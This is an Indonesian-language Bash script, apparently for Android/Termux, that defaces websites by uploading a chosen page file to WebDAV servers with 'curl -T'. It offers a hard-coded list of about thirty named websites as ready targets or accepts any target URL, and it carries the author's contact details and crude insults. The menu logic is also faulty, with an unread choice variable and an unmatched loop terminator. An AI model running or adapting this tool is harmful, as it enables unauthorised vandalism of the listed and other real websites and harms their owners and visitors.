#!/bin/bash

#Cilup.... Ba...
#MauRecodeYaGan :(
#IzinDuluYa...
#KaloMauRecode

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard
figlet -f pagga WEBDAV VIP | lolcat      
      echo $bi" contacts: 0895385827909"
      echo $bi" Author: 70LoLcvk" 
      echo $bi" Email: kaa800252@gmail.com"
      echo $me" FB: Ini Haxor "
      echo $me"              ["$ku"-"$me"]"$cy"WEBDAV DEFACE"$me"["$ku"-"$me"]"
      echo""
echo $ku "*note:"
echo""
echo $i"Script Deface Harus Di letakan di Sdcard"
echo $i"Dan Jangan Di Masukan Ke Folder Apapun"
echo -n $ku"Nama Script Deface?>" 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C Detected, Trying To Exit" | lolcat
echo ""
echo $" Byee,see you Ngentod " | lolcat
sleep 1 
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Belum Punya Target";
echo $me"[============"$pu"=============]"
echo $me"["$ku"2"$me"]" $pu"Sudah Punya Target";
echo ""
echo    "PILIH:" |lolcat
case $pil in
1)echo ""
echo $pu"List Target:"
echo $pu"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"
echo $me"
http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.co.z
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://shop.magazam.net
http://www.atakan.com.tr
http://www.magazam.net
http://ns1.atakan.com.tr
http://ns1.magazam.net
http://ns1.vfbayi.com
http://ns1.evdeiste.com
http://ptdel.com
http://majmudars.com
http://fmetiquetas.com
http://lacre.pt
http://www.anecra.pt
http://saharamutual.com
http://myownemailer.com
http://sphinxillustrations.com
http://www.sphinxanimations.com
http://vzcx.idasoft.es

"

echo ""
echo $pu"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"
echo -n $i"Masukan Salah Satu Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Deface.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"<<××××××××××××××××××××××××××××××××××××>>"
echo $ku"Silakan Di Cek di $cy $tg/$sc" 
echo $me"<<××××××××××××××××××××××××××××××××××××>>"

exit

;;


2)echo -n $i"Masukan Target>" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Deface..."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"///////////////////////////////////////"
echo $ku"Silakan Di Cek di $cy $tg/$sc" 
echo $me"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"

exit

;;


*) echo " CARI YANG ADA AJA TOD, Hadehh.... " | lolcat
esac
done
done
